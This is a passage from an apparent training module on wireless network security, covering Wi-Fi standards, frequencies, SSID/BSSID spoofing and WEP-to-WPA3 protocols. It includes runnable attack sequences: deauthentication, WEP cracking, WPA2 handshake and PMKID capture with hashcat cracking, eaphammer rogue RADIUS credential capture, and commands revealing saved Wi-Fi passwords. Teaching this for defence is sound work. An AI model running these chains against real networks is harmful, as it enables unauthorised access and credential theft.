# Stage 1.7 — Wireless Networks
### From Zero to Cybersecurity Professional | Complete Roadmap Series

> **Series:** Cybersecurity × OT/ICS Security — Full Roadmap  
> **Stage:** 1 — Network Fundamentals  
> **Module:** 1.7 — Wireless Networks  
> **Level:** Beginner → Advanced  
> **Prerequisites:** Stage 1.6 — Network Devices  
> **Next Module:** 1.8 — Network Analysis Tools

---

## Table of Contents

1. [Why Wireless Security Is a Permanent Battlefield](#1-why-wireless-security-is-a-permanent-battlefield)
2. [Wi-Fi Standards — 802.11 Family](#2-wi-fi-standards--80211-family)
3. [Radio Frequency Fundamentals — 2.4 GHz vs 5 GHz vs 6 GHz](#3-radio-frequency-fundamentals--24-ghz-vs-5-ghz-vs-6-ghz)
4. [SSID and BSSID — Wireless Identity](#4-ssid-and-bssid--wireless-identity)
5. [Wireless Security Protocols — WEP to WPA3](#5-wireless-security-protocols--wep-to-wpa3)
6. [WPA2 — The Dominant Standard and Its Weaknesses](#6-wpa2--the-dominant-standard-and-its-weaknesses)
7. [WPA3 — The Modern Standard](#7-wpa3--the-modern-standard)
8. [Rogue Access Point](#8-rogue-access-point)
9. [Evil Twin Attack](#9-evil-twin-attack)
10. [Additional Critical Wireless Attacks](#10-additional-critical-wireless-attacks)
11. [Wireless Forensics and Detection](#11-wireless-forensics-and-detection)
12. [Wireless in OT/ICS Environments](#12-wireless-in-otics-environments)
13. [Hands-On Exercises](#13-hands-on-exercises)
14. [Module Summary](#14-module-summary)

---

## 1. Why Wireless Security Is a Permanent Battlefield

Wireless networks are different from wired networks in one fundamental way: the medium is shared and accessible to anyone within range. An attacker does not need physical access to your building, does not need to plug into a network port, and does not leave physical evidence of their presence. They can sit in a car 200 metres away and conduct a full attack.

**Concrete attacks and consequences:**

**Target Corporation Breach (2013):** The initial access vector that ultimately compromised 40 million credit card numbers began with credentials stolen from a third-party HVAC vendor. That vendor had wireless access to Target's network for remote monitoring. Weak wireless network segmentation allowed movement from the vendor's access to payment systems. Wireless access granted to a third party became the entry point for the largest retail breach of its era.

**Marriott/Starwood Breach (2014-2018):** Hackers maintained access to Starwood's network for four years before discovery. Investigation revealed that some of the lateral movement exploited wireless network segments that were inadequately monitored. 500 million guest records compromised.

**Carbanak APT Campaign (2013-2015):** The criminal group responsible for stealing $1 billion from banks used spear phishing for initial access, but wireless networks within bank branches were used for lateral movement once inside the building. Physical proximity attackers (inside the building or nearby) used wireless to maintain persistent access.

**Industrial Wireless Attacks:** In documented OT security assessments, wireless networks in industrial facilities have been found:
- Using WEP encryption (breakable in minutes)
- Using WPA2 with default passwords (breakable in hours)
- Running unencrypted wireless sensor networks
- Connecting directly to the control network without isolation

**For your OT/ICS path:** Industrial wireless is growing rapidly — wireless sensors, wireless field device configuration tools, WiFi-enabled PLCs, wireless HMI tablets, and industrial IoT are all becoming standard. Each represents a wireless attack surface on systems that control physical processes. An attacker who compromises wireless in a manufacturing facility may be one hop from PLCs controlling heavy machinery.

The security mindset for this module: **Wireless is a shared medium. There is no such thing as "private" wireless — only wireless where the content is protected by cryptography. Every wireless transmission is received by every device in range. The question is only whether they can decode it.**

---

## 2. Wi-Fi Standards — 802.11 Family

### 2.1 IEEE 802.11 — The Standard Family

Wi-Fi is the commercial name for IEEE 802.11 — a set of standards developed by the IEEE (Institute of Electrical and Electronics Engineers) for wireless local area networks. Each amendment to the base standard adds new capabilities, higher speeds, or new frequency bands.

```
802.11 Standard Timeline and Security Relevance:

Year  Standard  Wi-Fi Name  Frequency    Max Speed    Security Notes
────────────────────────────────────────────────────────────────────────────
1997  802.11    (original)  2.4 GHz      2 Mbps       WEP only — broken
1999  802.11a   (none)      5 GHz        54 Mbps      WEP — broken
1999  802.11b   (none)      2.4 GHz      11 Mbps      WEP — broken
2003  802.11g   (none)      2.4 GHz      54 Mbps      WEP/WPA — WEP broken
2009  802.11n   Wi-Fi 4     2.4/5 GHz    600 Mbps     WPA2 — current minimum
2013  802.11ac  Wi-Fi 5     5 GHz        3.5 Gbps     WPA2/WPA3
2019  802.11ax  Wi-Fi 6     2.4/5/6 GHz  9.6 Gbps     WPA3 (Wi-Fi 6 requires)
2021  802.11ax  Wi-Fi 6E    6 GHz only   9.6 Gbps     WPA3 required
2024  802.11be  Wi-Fi 7     2.4/5/6 GHz  46 Gbps      WPA3 required
```

### 2.2 Key Technical Concepts Per Standard

**MIMO — Multiple Input, Multiple Output (802.11n and later):**

```
Single antenna (802.11g):          MIMO (802.11n, 4×4):
  [Transmitter] → [single stream] →   [TX1] → [stream 1] → [RX1]
  [Receiver]                           [TX2] → [stream 2] → [RX2]
                                        [TX3] → [stream 3] → [RX3]
                                        [TX4] → [stream 4] → [RX4]

More antennas = more spatial streams = higher throughput
802.11ac: up to 8 spatial streams (MU-MIMO — multiple simultaneous users)
802.11ax: OFDMA (Orthogonal Frequency Division Multiple Access)
          Multiple users simultaneously in same channel — more efficient

Security implication: MIMO and MU-MIMO complicate wireless analysis.
Specialised wireless adapters are needed to capture all spatial streams.
Consumer adapters typically capture only one stream in monitor mode.
```

**Channel Bonding:**

```
Standard channel width: 20 MHz
Bonded channels: 40 MHz (2 channels), 80 MHz (4 channels), 160 MHz (8 channels)

More bandwidth = faster throughput BUT:
  - Fewer non-overlapping channels available
  - Wider channels = more susceptible to interference
  - 80/160 MHz on 5 GHz: fewer total channels available

For attackers: wider channel = attack tool must monitor wider spectrum
For defenders: wider channels may interfere with wireless monitoring sensors
```

**802.11ax (Wi-Fi 6) — Security Mandates:**

Wi-Fi 6 certification requires WPA3 — the first Wi-Fi generation to mandate its security protocol. This is significant because:
- Devices certified for Wi-Fi 6 cannot use WPA2 alone
- WPA3 eliminates the PMKID offline attack that compromised WPA2
- WPA3 provides forward secrecy (old traffic cannot be decrypted even if password is later compromised)

However: Wi-Fi 6 capable hardware CAN still run in WPA2 mode for backward compatibility. "Wi-Fi 6 certified" ≠ "WPA3 only."

### 2.3 Security Implications by Standard

```
For penetration testing scope:
  Find 802.11b/g → WEP likely possible → trivially breakable
  Find 802.11n with WPA2 → PMKID or 4-way handshake capture → offline crack
  Find 802.11ac with WPA2 → same as above
  Find 802.11ax with WPA3 → significantly harder → SAE dragonfly handshake
  Find 802.11ax with WPA2 (downgrade) → can attack WPA2 portion

For network assessment:
  Identify all standards in use in the environment
  Any b/g networks with WEP: immediate critical finding
  Any n/ac networks with WPA2-Personal: assess password strength
  Any networks using WPA3: verify WPA2 transition mode is not exploited
```

```bash
# Identify Wi-Fi standards and security in use:
sudo iwlist wlan0 scan | grep -E "ESSID|Frequency|Encryption|IE:|WPA"

# With iw:
sudo iw dev wlan0 scan | grep -E "SSID:|freq:|RSN:|WPA:"

# Airodump-ng — comprehensive wireless survey:
sudo airmon-ng start wlan0          # Enable monitor mode
sudo airodump-ng wlan0mon           # Survey all networks

# Key columns in airodump-ng output:
# BSSID:    AP MAC address
# PWR:      Signal strength (higher negative = closer)
# Beacons:  Number of beacon frames received
# Data:     Data frames captured
# CH:       Channel
# MB:       Max speed (11=802.11b, 54=802.11g, indicates standard)
# ENC:      Encryption type (WEP, WPA, WPA2, WPA3)
# CIPHER:   Cipher used (CCMP=AES, TKIP=RC4)
# AUTH:     Authentication (PSK=pre-shared key, MGT=enterprise/RADIUS)
# ESSID:    Network name

# Wash — scan for WPS-enabled networks:
sudo wash -i wlan0mon
# WPS (Wi-Fi Protected Setup) has its own vulnerabilities (Pixie Dust, brute force)
```

> **Key Insight:** The 802.11 standard version tells you the likely attack surface before you even test the password. 802.11b/g typically means WEP or early WPA — trivially broken. 802.11n/ac means WPA2 — crackable with good wordlists. 802.11ax in WPA3 mode — significantly hardened. Reading the standard version from a scan is the first step in attack planning and in security assessment.

---

## 3. Radio Frequency Fundamentals — 2.4 GHz vs 5 GHz vs 6 GHz

### 3.1 Why Frequency Matters for Security

Radio frequency determines range, penetration, interference, and the number of available channels. All of these affect both attack capability and defence posture.

```
Frequency Comparison:

Property              2.4 GHz           5 GHz             6 GHz
────────────────────────────────────────────────────────────────────────────
Range (typical)        ~70m indoor       ~30m indoor       ~15m indoor
                       ~250m outdoor     ~100m outdoor     ~50m outdoor
Wall penetration        High              Medium            Low
Interference            High              Lower             Very low
Available channels      11 (3 non-overlap) 25 (9 non-overlap) 59 (all non-overlap)
Max speed              ~600 Mbps         ~3.5 Gbps         ~9.6 Gbps
Standard               802.11n and older  802.11a/n/ac/ax   802.11ax (6E) only
```

**Security Implications of Frequency:**

```
2.4 GHz — The Double-Edged Frequency:
  
  Advantages for attackers:
    Longer range → attack from greater distance
    Better building penetration → attack from outside building
    More device compatibility → wider attack surface
    
  Advantages for defenders:
    Easier to survey (widely supported by monitoring hardware)
    
  Interference sources:
    Microwave ovens (2.45 GHz), Bluetooth (2.4 GHz),
    baby monitors, cordless phones, ZigBee (2.4 GHz)
    Interference can be used to cause denial of service
    
5 GHz — The Performance Frequency:
  
  Advantages for attackers:
    More channels = harder to survey completely without multiple adapters
    
  Advantages for defenders:
    Shorter range limits attacker's standoff distance
    Less interference = more reliable performance
    
6 GHz — The New Frontier (Wi-Fi 6E):
  
  Only 802.11ax devices support this band
  Requires WPA3 — attacker cannot use WPA2 downgrade attacks
  Very short range limits attack distance significantly
  All 59 channels are 20 MHz non-overlapping → efficient spectrum use
  Limited hardware support currently limits monitoring capability
```

### 3.2 Channels and Their Security Relevance

```
2.4 GHz channels (US: 1-11, Europe: 1-13, Japan: 1-14):

Channel: 1  2  3  4  5  6  7  8  9  10  11
         ├──────────┤
              ├──────────┤
                   ├──────────┤
                        ...

Non-overlapping channels (US): 1, 6, 11
Each channel: 20 MHz wide, centres 5 MHz apart → overlap

In a dense environment, having networks on channels 1, 6, 11 reduces
interference. Networks on intermediate channels (2-5, 7-10) interfere
with TWO non-overlapping channels simultaneously — bad design.

Security implication: Rogue AP placement on overlapping channels causes
interference with legitimate AP → partial DoS that forces clients to
roam to attacker-controlled AP.

5 GHz channels (subset):
  36, 40, 44, 48 (UNII-1 — indoor)
  52, 56, 60, 64 (UNII-2 — DFS required)
  100-144 (UNII-2C — DFS required)
  149, 153, 157, 161, 165 (UNII-3 — outdoor)

DFS (Dynamic Frequency Selection): required on some 5 GHz channels to
avoid interfering with radar systems. AP must monitor for radar and
switch channels if detected. Attackers can send fake radar signals
to force AP channel switches (channel flooding attack).
```

```bash
# Survey available channels and signal strength:
sudo iwlist wlan0 scan | grep -E "Channel|Signal|ESSID|Frequency"

# Airodump-ng channel hopping:
sudo airodump-ng wlan0mon                    # Hops through all channels
sudo airodump-ng --channel 6 wlan0mon        # Lock to channel 6
sudo airodump-ng --band abg wlan0mon         # Scan 2.4 + 5 GHz simultaneously

# Check for radar detection events (DFS) on Linux:
iw dev wlan0 info | grep wiphy
iw phy phy0 info | grep -A5 "DFS state"

# Channel utilisation analysis (airspy-NG or similar):
# High channel utilisation = interference = possible attack or congestion
# Medium: 0-30% normal, 30-60% busy, 60%+ problematic
```

> **Key Insight:** The 2.4 GHz band's long range and wall penetration means your corporate Wi-Fi network may be accessible from the car park, the street, or the neighbouring building. A standard Yagi antenna can extend this range to 1 km. The attacker does not need to be inside your perimeter. Physical security and wireless security are separate but complementary — a fence stops physical intrusion; wireless signals cross that fence freely.

---

## 4. SSID and BSSID — Wireless Identity

### 4.1 SSID — Service Set Identifier

The SSID is the human-readable name of a wireless network — what you see when you scan for Wi-Fi. It can be up to 32 bytes (not strictly characters — can include any bytes including null bytes).

```
SSID Properties:
  Length: 0-32 bytes
  Characters: any (including non-printable, null bytes, special characters)
  Case-sensitive: "CorpWiFi" ≠ "corpwifi"
  Not unique: multiple APs can broadcast the same SSID (roaming design)
  Not authenticated: any AP can broadcast any SSID

SSID Broadcast — Beacon Frames:
  AP sends beacon frames ~10 times per second
  Beacons contain: SSID, BSSID, channel, supported rates, security info
  Visible to anyone with a wireless adapter in monitor mode
  
Hidden SSID (SSID cloaking):
  AP sends beacon with empty SSID field
  Network doesn't appear in normal scan results
  Security through obscurity — NOT a security control
  
Why hidden SSID fails:
  1. SSID appears in Probe Response frames when client connects
  2. SSID appears in client Probe Request frames (client broadcasts SSID it's looking for)
  3. Passive monitoring captures SSID the moment any client connects
  4. Tools: airodump-ng shows hidden SSIDs after capturing first connection
```

**SSID Security Attacks:**

```bash
# Discover hidden SSIDs:
sudo airodump-ng wlan0mon
# Hidden SSIDs appear as: <length: X> where X = actual SSID length
# Wait for a client to connect → SSID revealed in probe request/response

# Force reveal of hidden SSID by sending deauth to clients:
# When clients reconnect, they send probe requests with the SSID
sudo aireplay-ng --deauth 5 -a BSSID_OF_HIDDEN_AP wlan0mon
# -deauth 5: send 5 deauthentication frames
# -a: target AP's MAC address

# Monitor probe requests to see what networks clients are looking for:
sudo airodump-ng wlan0mon
# Look at bottom section: "Probes" column shows networks clients have connected to
# This is useful for:
# 1. Identifying hidden SSIDs
# 2. Finding preferred networks for evil twin setup
# 3. OSINT on users (what networks they've connected to)

# SSID spoofing (setting up AP with same name as target):
sudo hostapd /tmp/hostapd.conf
# Where hostapd.conf sets ssid=TargetNetworkName
# No cryptographic verification of SSID → any AP can claim any name
```

### 4.2 BSSID — Basic Service Set Identifier

The BSSID is the MAC address of the access point's wireless interface. It uniquely identifies a specific physical radio transmitter.

```
BSSID Properties:
  Format: 6-byte MAC address (XX:XX:XX:XX:XX:XX)
  Typically matches AP's wireless NIC MAC address
  
  OUI (first 3 bytes) identifies manufacturer:
  00:1A:11 → Google (Pixel phones, Google Nest)
  00:50:56 → VMware
  3C:22:FB → Apple
  
  For APs:
  00:1C:0E → Cisco Linksys
  F8:1A:67 → TP-Link
  B4:FB:E4 → Ubiquiti
  
Multi-SSID / Virtual APs:
  One physical AP can broadcast multiple SSIDs simultaneously
  Each SSID gets its own BSSID (MAC address incremented by 1)
  Example:
    Physical AP MAC: 00:11:22:33:44:55
    Corporate SSID BSSID:    00:11:22:33:44:55
    Guest SSID BSSID:        00:11:22:33:44:56
    IoT SSID BSSID:          00:11:22:33:44:57
```

**BSSID in Attack Context:**

```bash
# Use BSSID to identify AP manufacturer and potentially model:
# OUI lookup:
python3 -c "
import urllib.request
bssid = '00:1C:0E:12:34:56'
oui = bssid[:8].replace(':', '-').upper()
try:
    url = f'https://api.macvendors.com/{oui}'
    r = urllib.request.urlopen(url, timeout=3)
    print(f'Vendor: {r.read().decode()}')
except:
    print('OUI lookup failed')
"

# Track a specific AP (lock airodump to specific BSSID):
sudo airodump-ng --bssid TARGET_BSSID --channel 6 -w capture wlan0mon
# Captures only traffic from/to that specific AP
# Useful for focused attack or analysis

# BSSID spoofing — impersonate legitimate AP:
# Tools set wireless adapter MAC to match target BSSID
sudo ip link set wlan0 down
sudo ip link set wlan0 address 00:1C:0E:12:34:55   # Spoof MAC to match AP
sudo ip link set wlan0 up
# Now your adapter appears as the legitimate AP when transmitting
# Foundation of evil twin attacks

# GPS mapping of BSSID (wardriving):
sudo kismet -c wlan0               # Kismet with GPS records BSSID + GPS coords
# Creates map of all wireless networks
# Used for: site survey, finding coverage gaps, geolocation of rogues
```

**Preferred Network List (PNL) — Client Device Attack Surface:**

```
Every device stores a Preferred Network List:
  Networks the device has previously connected to
  Device automatically connects to known networks
  
Problem: Device probes for known networks:
  "Is CorpWiFi here?"
  "Is HomeNetwork here?"
  "Is Starbucks here?"
  
Attacker captures probe requests → knows all networks device has connected to
Attacker creates Evil Twin with any of those names → device may auto-connect

Windows PNL:
  netsh wlan show profiles                    # List saved networks
  netsh wlan show profile name="Corporate" key=clear  # Show saved password!

Linux (NetworkManager):
  nmcli connection show                       # List saved connections
  ls /etc/NetworkManager/system-connections/  # Configuration files with passwords

macOS:
  security find-generic-password -D "AirPort network password" -a "NetworkName" -w

Forensic relevance:
  PNL on confiscated device reveals travel history, home networks, work networks
  Can be used to attribute device to specific locations and organisations
```

> **Key Insight:** The SSID is not authenticated. Any AP can broadcast any SSID. The BSSID (MAC address) can be spoofed in software. Clients auto-connect to "known" networks based solely on SSID match. This combination — unauthenticated identity, spoofable address, automatic connection — is the foundation of nearly every wireless client-side attack. WPA3's approach of Simultaneous Authentication of Equals partially addresses this by making the handshake resistant to offline attacks even when SSID is spoofed.

---

## 5. Wireless Security Protocols — WEP to WPA3

### 5.1 WEP — Wired Equivalent Privacy (1997)

WEP was the original 802.11 security protocol, intended to provide privacy equivalent to a wired network. It failed catastrophically.

**How WEP Works:**

```
WEP Encryption:
  Key: 40-bit or 104-bit pre-shared key (PSK)
  IV:  24-bit Initialization Vector (randomly generated per packet)
  
  Encryption:
  ┌────────────────────────────────────────────────────────┐
  │  Keystream = RC4(IV + Key)                            │
  │  Ciphertext = Plaintext XOR Keystream                 │
  │  Transmitted: [IV (24 bits)][Ciphertext][ICV (CRC-32)]│
  └────────────────────────────────────────────────────────┘
  
  IV = 24 bits = 16,777,216 possible values
  On a busy network: IV repeats every ~5 hours (or less)
  When IV repeats: same keystream used for different plaintexts
  Keystream recovery: XOR two ciphertexts with same IV
```

**Why WEP Is Broken:**

```
Vulnerabilities:
  
1. Short IV (24 bits):
   IV reuse guaranteed on active networks
   IV of 0 to 16M → cycles completely in hours
   
2. RC4 weak keys ("related key" attack):
   Certain IV values create weak RC4 keystreams
   Statistical analysis of these weak keys reveals the WEP key
   Fluhrer, Mantin, Shamir (FMS) attack (2001)
   
3. CRC-32 is not cryptographically secure:
   CRC-32 provides error detection, not cryptographic integrity
   Attacker can modify ciphertext and update CRC correctly
   → Bit-flipping attacks possible without knowing the key
   
4. No mutual authentication:
   Client authenticates to AP, AP does not prove its identity to client
   
Attack timeline to crack WEP:
  Original FMS attack (2001): required ~4 million packets (~1 day)
  PTW attack (Tews, Weinmann, Pyshkin, 2007): 40,000-85,000 packets (~minutes)
  Aircrack-ng with PTW: WEP 64-bit cracked in ~60 seconds
```

```bash
# WEP cracking (educational — only on networks you own):

# Step 1: Enable monitor mode
sudo airmon-ng start wlan0
# Adapter: wlan0 → wlan0mon

# Step 2: Find target WEP network
sudo airodump-ng wlan0mon
# Note: BSSID, Channel, ESSID of target (ENC column shows WEP)

# Step 3: Capture IVs for target network
sudo airodump-ng --bssid TARGET_BSSID --channel 6 -w wep_capture wlan0mon

# Step 4: Accelerate IV collection via ARP replay attack
sudo aireplay-ng --arpreplay -b TARGET_BSSID -h YOUR_MAC wlan0mon
# ARP replay: capture one ARP packet, replay it → AP generates new IVs

# Step 5: Crack when enough IVs collected (40,000+)
aircrack-ng wep_capture*.cap
# Typically cracks in <60 seconds with enough IVs

# Detection of WEP cracking:
# Extremely high data rates from specific client (ARP replay)
# IDS alert on ARP replay (repeated identical ARP packets)
# Wireless IDS: Kismet, AirDefense detect injection attacks
```

### 5.2 WPA — Wi-Fi Protected Access (2003)

WPA was designed as a rapid fix for WEP's catastrophic failures while being deployable on existing WEP hardware via firmware update.

```
WPA Components:
  Protocol:    TKIP (Temporal Key Integrity Protocol)
  Key mixing:  Per-packet key mixing (prevents related key attacks)
  IV:          48-bit (vs WEP's 24-bit) — much larger keyspace
  Integrity:   Michael MIC (Message Integrity Code) — better than CRC-32
  Authentication: PSK (personal) or 802.1X/RADIUS (enterprise)
  
TKIP improvements over WEP:
  ✓ Per-packet key derived from base key + packet counter
  ✓ 48-bit IV → IV reuse extremely unlikely
  ✓ Michael MIC → detects packet modification
  
TKIP weaknesses (why WPA is deprecated):
  ✗ Still based on RC4 (flawed cipher)
  ✗ Michael MIC has known weaknesses (TKIP chop-chop attack)
  ✗ Beck-Tews and Ohigashi-Morii attacks (2009) against TKIP
  ✗ RC4 inherently weaker than AES
  
WPA should not be used today. WPA2 is the minimum.
```

---

## 6. WPA2 — The Dominant Standard and Its Weaknesses

### 6.1 WPA2 Architecture

WPA2 (IEEE 802.11i, ratified 2004) replaced the RC4/TKIP of WPA with AES/CCMP — a fundamentally stronger foundation.

```
WPA2 Key Hierarchy:
                    ┌──────────────────────────────────┐
                    │         PMK (Pairwise Master Key) │ 256 bits
                    │    Derived from: password + SSID  │
                    │    PSK: PBKDF2-SHA1(password,     │
                    │         SSID, 4096, 256 bits)     │
                    └──────────────────┬───────────────┘
                                       │
                    ┌──────────────────▼───────────────┐
                    │    4-Way Handshake                │
                    │    Inputs: PMK + ANonce + SNonce  │
                    │    ANonce: AP's random number     │
                    │    SNonce: Client's random number │
                    └──────────────────┬───────────────┘
                                       │
                    ┌──────────────────▼───────────────┐
                    │         PTK (Pairwise Transient Key)│
                    │    512 bits total, split into:    │
                    │    KCK (128): key confirmation    │
                    │    KEK (128): key encryption      │
                    │    TK  (128): traffic encryption  │
                    │    MIC (128): message integrity   │
                    └──────────────────────────────────┘
```

### 6.2 The 4-Way Handshake — WPA2's Critical Exchange

```
AP (Authenticator)                         Client (Supplicant)
         │                                          │
         │── Message 1: EAPOL-Key ─────────────→   │
         │   [ANonce] (AP's random nonce)           │
         │   [Replay counter]                       │
         │                                          │
         │                                          │ Client computes PTK from:
         │                                          │ PMK + ANonce + SNonce + MACs
         │                                          │
         │ ←─ Message 2: EAPOL-Key ────────────── │
         │   [SNonce] (Client's random nonce)       │
         │   [MIC] (proves client knows PMK)        │
         │   [RSN IE] (security capabilities)       │
         │                                          │
         │ AP computes PTK, verifies MIC            │
         │                                          │
         │── Message 3: EAPOL-Key ─────────────→   │
         │   [GTK] (Group Temporal Key, encrypted)  │
         │   [MIC] (proves AP knows PMK)            │
         │   [Install flag]                         │
         │                                          │
         │ ←─ Message 4: EAPOL-Key ────────────── │
         │   [MIC] (acknowledges GTK)               │
         │                                          │
         │         [Encrypted session begins]       │
```

**Why the 4-Way Handshake Is the Primary Attack Target:**

The 4-way handshake contains all the information needed to perform an offline dictionary attack on the PMK (which is derived directly from the password). An attacker who captures the handshake can:
1. Take it offline
2. For each candidate password: compute PMK → PTK → verify MIC
3. If MIC matches: password found

No interaction with the AP is needed after capture. The attack is rate-limited only by the attacker's hardware (GPU speed).

### 6.3 WPA2-Personal (PSK) Attack — Complete Walkthrough

```bash
# Complete WPA2-PSK attack chain:

# Step 1: Enable monitor mode
sudo airmon-ng check kill           # Kill interfering processes
sudo airmon-ng start wlan0          # Start monitor mode
# Result: wlan0mon

# Step 2: Survey the environment
sudo airodump-ng wlan0mon
# Look for target: ENC=WPA2, AUTH=PSK
# Note: BSSID, channel, client stations (STA section at bottom)

# Step 3: Target-specific capture
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \     # Target AP MAC address
    --channel 6 \                    # AP's channel
    -w /tmp/capture \                # Output file prefix
    wlan0mon
# Captures all traffic from target, saves to /tmp/capture-01.cap

# Step 4a: Wait for organic client connection (passive)
# OR Step 4b: Force client reconnection via deauthentication (active)
sudo aireplay-ng \
    --deauth 1 \                     # Send 1 deauth frame (gentle — more = DoS)
    -a AA:BB:CC:DD:EE:FF \          # Target AP BSSID
    -c 11:22:33:44:55:66 \          # Specific client (optional — omit for broadcast)
    wlan0mon
# Client is disconnected, automatically reconnects → handshake captured

# Verify handshake capture (airodump shows WPA handshake top right):
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Step 5: Offline password cracking

# Option A: Aircrack-ng (CPU-based)
aircrack-ng \
    -w /usr/share/wordlists/rockyou.txt \  # Wordlist
    -b AA:BB:CC:DD:EE:FF \                  # Target BSSID
    /tmp/capture-01.cap
# Speed: ~2,000-10,000 passwords/second on CPU

# Option B: Hashcat (GPU-based — much faster)
# First, convert cap to hashcat format:
hcxpcapngtool \
    -o /tmp/hash.hc22000 \                  # Output in hashcat format 22000
    /tmp/capture-01.cap                      # Input capture

# Crack with Hashcat:
hashcat \
    -m 22000 \                               # WPA2 mode
    /tmp/hash.hc22000 \                      # Input hash
    /usr/share/wordlists/rockyou.txt \       # Wordlist
    -r /usr/share/hashcat/rules/best64.rule  # Rules (transform wordlist entries)
# Speed: ~1,000,000+ passwords/second on modern GPU (RTX 4090: ~2,000,000 H/s)

# Option C: PMKID attack (no client needed — passive attack!)
# More on PMKID in next section
```

### 6.4 PMKID Attack — The Game Changer (2018)

**Discovered by Jens Steube (Hashcat author), August 2018:**

Traditional WPA2 cracking required capturing a 4-way handshake, which required a client to connect. The PMKID attack requires NO CLIENT — just the AP.

```
PMKID — Pairwise Master Key Identifier:
  Computed by AP in Message 1 of the 4-way handshake (and RSN IE)
  Formula: PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)
  
  Critically: PMKID contains enough information to verify a PMK guess
  without capturing the full 4-way handshake
  
  Since PMK = PBKDF2(password, SSID, 4096, 32):
  Attacker can attempt: compute PMK from password guess → compute expected PMKID
  If PMKID matches: password found
  
  Advantage:
  - No client required (single frame from AP sufficient)
  - Attack can begin immediately upon scanning
  - Cannot be prevented without upgrading to WPA3
```

```bash
# PMKID attack:

# Step 1: Capture PMKID (uses hcxdumptool):
sudo hcxdumptool \
    -i wlan0mon \                    # Monitor mode interface
    -o /tmp/pmkid_capture.pcapng \   # Output file
    --enable_status=1 \              # Show status
    --filterlist_ap=/tmp/target_bssids.txt  # Optional: specific APs only
# Wait for PMKID — usually captured within 30-60 seconds without any clients

# Step 2: Extract hash for hashcat:
hcxpcapngtool \
    -o /tmp/pmkid.hc22000 \
    /tmp/pmkid_capture.pcapng

# Step 3: Crack (identical to handshake cracking):
hashcat -m 22000 /tmp/pmkid.hc22000 wordlist.txt

# Verify captured PMKIDs:
hcxpcapngtool -E essidlist -I identitylist -U usernamelist /tmp/pmkid_capture.pcapng
cat essidlist                        # Networks captured
```

### 6.5 WPA2-Enterprise (802.1X/EAP)

WPA2-Enterprise replaces the pre-shared key with per-user credentials verified by a RADIUS server.

```
WPA2-Enterprise Authentication Flow:
  
  Client → AP: Association Request
  AP → Client: EAP Request (identity)
  Client → AP: EAP Response (username)
  AP → RADIUS: Access Request (EAP data forwarded)
  RADIUS: validates credentials
  RADIUS → AP: Access Accept/Reject
  AP → Client: EAP Success/Failure
  AP → Client: 4-way handshake (if success)
  
EAP Types:
  PEAP (Protected EAP): Tunnelled TLS + MSCHAPv2
    Most common in enterprise
    Password-based inside TLS tunnel
  EAP-TLS: Certificate-based (client AND server certificates)
    Most secure — no password to steal
    Requires certificate infrastructure
  EAP-TTLS: Similar to PEAP, more flexible
  EAP-FAST: Cisco proprietary, no certificates
```

**WPA2-Enterprise Attacks — Rogue RADIUS/Evil Twin:**

```
Attack against PEAP:
  1. Client tries to connect to corporate WiFi
  2. Attacker's evil twin AP with same SSID responds
  3. Client starts PEAP handshake
  4. Attacker's rogue RADIUS presents a certificate
  5. If client doesn't validate certificate: client sends MSCHAPv2 challenge response
  6. Attacker captures MSCHAPv2 challenge-response
  7. Offline crack: MSCHAPv2 is breakable with asleap or hashcat (-m 5500)
  
Critical defence: 
  Configure supplicant (client) to validate RADIUS server certificate
  Specify exact certificate fingerprint or CA
  Without this: clients connect to any RADIUS claiming the right SSID

Tools:
  hostapd-wpe: Creates rogue RADIUS for credential capture
  eaphammer: Automated WPA2-Enterprise attack framework
  asleap: Cracks captured MSCHAPv2 credentials
```

```bash
# WPA2-Enterprise attack with eaphammer:
# (Educational — requires explicit permission)
sudo eaphammer \
    --interface wlan0mon \
    --channel 6 \
    --ssid "CorporateWiFi" \         # Target SSID
    --auth peap \                    # EAP type
    --creds                          # Capture credentials mode
# Eaphammer creates rogue AP + RADIUS server
# Captures PEAP credentials from connecting clients
# Outputs NetNTLMv1/v2 hashes crackable with hashcat

# Crack captured MSCHAPv2:
hashcat -m 5500 captured_hashes.txt wordlist.txt   # NetNTLMv1
hashcat -m 5600 captured_hashes.txt wordlist.txt   # NetNTLMv2
```

> **Key Insight:** WPA2-PSK security is entirely dependent on password strength. The PMKID attack means an attacker can start cracking without waiting for a client — just the AP is sufficient. A common 8-character password from rockyou.txt falls in seconds on a GPU. The only defence is a password that will not appear in any wordlist: 25+ random characters or a true random passphrase. WPA3 eliminates this offline attack entirely.

---

## 7. WPA3 — The Modern Standard

### 7.1 WPA3 Key Improvements

WPA3 (released 2018, Wi-Fi Alliance certification began 2018) addresses the fundamental weaknesses of WPA2.

**SAE — Simultaneous Authentication of Equals (Dragonfly Handshake):**

```
WPA2 Problem:
  PMK derived from password + SSID using PBKDF2
  PMK deterministic from password → offline dictionary attack
  Attacker needs: captured handshake + password guesses → verify offline

WPA3 Solution — SAE (RFC 7664):
  Based on Diffie-Hellman key exchange
  Password is used to derive a point on an elliptic curve (or DH group)
  Both parties engage in a commit-confirm exchange
  Session key derived from DH exchange → perfect forward secrecy
  
  Key property: password NOT directly verifiable without LIVE interaction with the network
  → No offline dictionary attack possible (attacker must interact with real AP for each guess)
  → Forward secrecy: old traffic cannot be decrypted even if password later compromised

WPA3 Authentication:
  Commit phase:
    Both parties send: scalar + element (derived from password + random value)
    AP: compute from (password, random R_AP)
    Client: compute from (password, random R_Client)
  
  Confirm phase:
    Both verify each other's commitment
    If password correct: derive shared session key
    
  Why offline cracking fails:
    Each handshake uses different random values
    Without knowing both random values (one is secret), PMK cannot be recovered
    Each guess requires live interaction with AP (rate-limited)
```

**WPA3-Personal vs WPA3-Enterprise:**

```
WPA3-Personal:
  Replaces WPA2-PSK
  Uses SAE instead of 4-way handshake password verification
  Still uses pre-shared password (human-memorable)
  Eliminates offline dictionary attacks
  
WPA3-Enterprise:
  192-bit security mode (optional but available)
  Requires 192-bit AES-256-GCMP for data encryption
  Requires ECDSA-384 for certificates
  Requires SHA-384 for HMAC
  Designed for government, financial, critical infrastructure
  
WPA3-Enterprise vs WPA2-Enterprise:
  WPA2-Enterprise: 128-bit AES (CCMP), SHA-1 HMAC
  WPA3-Enterprise 192-bit: 256-bit AES, SHA-384 HMAC → much stronger
```

### 7.2 WPA3 Transition Mode and Its Risks

Most WPA3 deployments use "Transition Mode" — supporting both WPA3 and WPA2 simultaneously for backward compatibility.

```
